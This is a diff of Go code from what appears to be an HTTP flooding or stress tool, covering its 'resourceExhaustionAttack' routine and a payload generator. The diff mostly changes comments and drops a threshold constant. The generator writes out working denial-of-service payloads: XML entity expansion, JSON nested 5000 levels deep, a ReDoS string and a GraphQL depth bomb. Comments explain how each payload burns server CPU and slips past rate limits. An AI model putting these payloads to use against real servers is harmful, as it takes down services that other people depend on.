-// resourceExhaustionAttack (type 9), sends payloads designed to maximize
+// resourceExhaustionAttack (type 9) — sends payloads designed to maximize
 // server-side CPU and memory consumption per request rather than raw network
 // volume. each variant targets a different parsing pathway so the server has to
 // do real work processing the body, not just receive bytes.
@@ -1440,8 +1639,7 @@ func resourceExhaustionAttack(target string, client *http.Client) {
 			// burn signal: a response slow enough to clear the threshold is the only
 			// externally observable hint that the payload actually cost the server
 			// work (deep recursion, entity expansion, regex backtracking) rather than
-			// being parsed cheaply or rejected. p95/max latency in the per-type table
-			// tells the same story; this gives a single headline "burn rate."
+			// being parsed cheaply or rejected.
 			atomic.AddUint64(&resourceCompleted, 1)
 			if elapsed.Milliseconds() >= resourceBurnThresholdMs {
 				atomic.AddUint64(&resourceBurnHits, 1)
@@ -1462,25 +1660,20 @@ func resourceExhaustionAttack(target string, client *http.Client) {
 			lastRequestSize = uint64(requestBytes)
 			lastResponseSize = uint64(len(responseData))
 			lastResponseCode = uint64(resp.StatusCode)
-			lastRequestProto = "RSRC:" + label // which payload was in flight
+			lastRequestProto = "RSRC:" + label // which payload variant was in flight
 			requestTrackingMux.Unlock()
 		}()
 	}
 	wg.Wait()
 }
 
-// resourceBurnThresholdMs is how slow a type-9 response must be before we count it
-// as a "burn", i.e. evidence the payload made the server do real work. 1s is well
-// above a normal POST round-trip but below most request timeouts.
-const resourceBurnThresholdMs = 1000
-
 // resourceExhaustPayload returns one of four payloads each targeting a different
 // server-side parser. the idea is to burn server CPU on parsing rather than on
-// network I/O, per-request CPU cost is much harder to rate-limit than bytes.
+// network I/O — per-request CPU cost is much harder to rate-limit than bytes.
 func resourceExhaustPayload() (body, contentType, label string) {
 	switch mathrand.Intn(4) {
 	case 0:
-		// XML entity expansion (billion-laughs structure, bounded depth),
+		// XML entity expansion (billion-laughs structure, bounded depth) —
 		// parsers without entity expansion limits resolve this recursively.
 		// four levels of &d; expands to 10^4 = 10,000 repetitions of "AAAAAAAAAA".
 		return `<?xml version="1.0"?><!DOCTYPE x [` +
@@ -1490,20 +1683,20 @@ func resourceExhaustPayload() (body, contentType, label string) {
 			`<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">` +
 			`]><r>&d;</r>`, "application/xml", "xml"
 	case 1:
-		// deeply nested JSON object, forces recursive descent parsing to
+		// deeply nested JSON object — forces recursive descent parsing to
 		// stack depth 5000. parsers with no depth limit allocate one stack
 		// frame per level; Go's encoding/json will return an error at ~1000.
 		depth := 5000
 		return strings.Repeat(`{"x":`, depth) + `"v"` + strings.Repeat("}", depth),
 			"application/json", "json-deep"
 	case 2:
-		// ReDoS bait, search/filter endpoints often run input through regex
+		// ReDoS bait — search/filter endpoints often run input through regex
 		// validators. patterns like (a+)+ exhibit catastrophic backtracking
 		// on inputs that almost match. the trailing "!" forces max backtrack.
 		return "q=" + strings.Repeat("a", 8000) + "!",
 			"application/x-www-form-urlencoded", "redos"
 	default:
-		// GraphQL introspection depth bomb, if the target exposes /graphql,
+		// GraphQL introspection depth bomb — if the target exposes /graphql,
 		// deeply nested __schema queries force recursive schema graph traversal.
 		return `{"query":"{__schema{types{fields{type{fields{type{fields{type{name}}}}}}}}}}"}`,
 			"application/json", "graphql"
